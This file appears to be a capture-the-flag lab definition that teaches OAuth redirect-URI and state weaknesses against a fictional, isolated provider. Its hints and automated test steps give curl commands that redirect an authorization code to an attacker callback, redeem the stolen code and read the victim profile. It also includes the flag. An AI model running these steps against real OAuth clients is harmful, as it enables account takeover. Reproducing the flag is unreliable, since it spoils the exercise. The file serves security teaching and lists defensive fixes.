@@ -1,0 +1,126 @@
+title: "OAuth/OIDC: Redirects, State, and Token Trust"
+category: authentication
+difficulty: intermediate
+estimated_time: 50
+prerequisites:
+  - identity-1-1-secure-authentication
+# By completion students will be able to:
+learning_outcomes:
+  - Trace an authorization-code flow and name each parameter
+  - Explain redirect URI allowlisting, state, PKCE, and token audience
+  - Demonstrate how an unvalidated callback receives another user's code
+  - Exchange a stolen code and read the victim profile
+  - Describe the client and provider fixes
+mapped_skills:
+  - identity_access
+  - web_api
+assessment_criteria:
+  - Submit the correct flag.
+  - Pass every automated test step in the lab manifest.
+  - Name the redirect URI and state controls that were missing.
+mitre_attack:
+  - tactic: Credential Access
+    technique: T1528
+    technique_name: Steal Application Access Token
+    detection: Alert on authorization codes redeemed from an unexpected client or network, repeated code redemption, and token use without a matching client session.
+
+owner: "OpenCyberRange Curriculum"
+content_version: "2.5.5"
+reviewed_at: "2026-11-10"
+review_status: "static student walkthrough; live lab run pending"
+description: "A community portal uses a mock OpenID Connect provider. The client accepts any redirect URI and does not use state or PKCE. Send the authorization code to an attacker-controlled callback, exchange it for an access token, and read the victim profile. Then explain the exact redirect allowlist, state, PKCE, and token-validation fixes."
+visibility: public
+flag: "OCR{redirect_uri_trust_is_not_authentication}"
+
+tools:
+  - browser
+  - curl
+  - terminal
+
+scenario: |
+  A community centre has started using Community ID, a fictional single
+  sign-on provider, for a new volunteer portal. The portal team registered the
+  client in a hurry.
+
+  The client accepts any redirect URI, does not require a state value, and does
+  not use PKCE. Your job is to see where the authorization code can be
+  delivered, exchange it for an access token, and read the victim's profile.
+  Then explain which controls would have stopped the flow.
+
+  The provider, portal, and accounts are fictional. The target is isolated and
+  never calls an external identity provider.
+
+troubleshooting: "If the authorization page returns a redirect error, check that redirect_uri is present and URL-encoded. The attacker page is a simulated callback on the same training host. If the token exchange fails, use the exact code shown on the callback page. Never test redirect URI handling against a real provider."
+defensive_takeaways: "Register an exact redirect URI allowlist and reject everything else. Use a per-request state value and verify it on the callback. Use PKCE for public clients, issue short-lived one-time codes, bind the code to the client, and validate the token audience, issuer, and expiry. Store tokens where client-side script cannot read them."
+difficulty_evidence: "Static student-tester walkthrough of the lab definition, mock provider, and workbook; live lab run not recorded; declared difficulty 'intermediate' retained as provisional because the learner must trace a multi-step flow."
+difficulty_evidence_source: "reviewer_walkthrough"
+difficulty_evidence_sample: 1
+difficulty_evidence_quality: "provisional"
+difficulty_evidence_reviewed_at: "2026-11-10"
+workbook: "wiki/range/identity/CH_IAM01_Identity_And_Access/02_OAuth_OIDC/"
+
+hostnames:
+  - ip_offset: "92"
+    hostname: "identity-oauth.lab"
+    description: "Community ID and portal target (HTTP 8080)"
+
+topology:
+  nodes:
+    - id: "portal"
+      label: "Community ID and volunteer portal"
+      type: "server"
+      ip_offset: "92"
+      ports: [8080]
+      services: ["http"]
+      x: 1
+      y: 1
+
+hints:
+  - text: |
+      Open the sign-in flow and look at the `authorize` URL. It carries
+      `client_id`, `redirect_uri`, `response_type`, and `state`.
+    unlock_after_minutes: 0
+
+  - text: |
+      Change `redirect_uri` to `http://identity-oauth.lab:8080/attacker` and
+      authorize. The provider accepts it because the client has no exact
+      redirect allowlist.
+    unlock_after_minutes: 8
+
+  - text: |
+      The attacker page receives the code. Use the exchange link to call
+      `/token`, then copy the `access_token` into `/me?access_token=...`.
+    unlock_after_minutes: 14
+
+  - text: |
+      The fixes are an exact redirect URI allowlist, a verified `state` value,
+      PKCE, one-time short-lived codes, client binding, and token audience
+      checks. A code must not be usable by a different client or callback.
+    unlock_after_minutes: 20
+
+test:
+  steps:
+    - name: "Community ID page responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.portal}:8080/"
+      expect: "200"
+      timeout: 20
+
+    - name: "Provider redirects the code to the unvalidated callback"
+      command: "curl -s -o /dev/null -w '%{redirect_url}' 'http://{target.portal}:8080/authorize?client_id=community-portal&redirect_uri=http://identity-oauth.lab:8080/attacker&response_type=code&state=demo' | grep -c '/attacker?code=AUTH-CODE-7f3a'"
+      expect: "1"
+      timeout: 20
+
+    - name: "The stolen code exchanges for an access token"
+      command: "curl -s 'http://{target.portal}:8080/token?code=AUTH-CODE-7f3a&client_id=community-portal' | grep -c 'ACCESS-TOKEN-amara-7f3a'"
+      expect: "1"
+      timeout: 20
+
+    - name: "The profile endpoint rejects an anonymous request"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.portal}:8080/me"
+      expect: "401"
+      timeout: 20
+
+    - name: "The stolen access token reveals the victim token"
+      command: "curl -s 'http://{target.portal}:8080/me?access_token=ACCESS-TOKEN-amara-7f3a' | grep -o 'OCR{[^}]*}'"
+      expect: "OCR{redirect_uri_trust_is_not_authentication}"
+      timeout: 20
